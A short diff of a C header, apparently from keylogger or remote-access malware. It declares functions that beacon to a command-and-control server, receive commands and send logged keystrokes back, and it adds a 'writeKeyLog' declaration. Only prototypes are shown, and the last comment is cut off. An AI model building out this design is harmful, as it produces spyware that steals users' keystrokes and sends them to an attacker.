@@ -31,7 +31,7 @@ ERR_CODE registerClient(CLIENT_HANDLER* client);
 
 // functions utilised by the worker threads!
 ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
-// ErrorCode writeBuffer(CLIENT_HANDLER* client); // write the key buffer to the C2
+ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bufferLen);  // write 
 
 void clientCleanup(CLIENT_HANDLER* client);
 
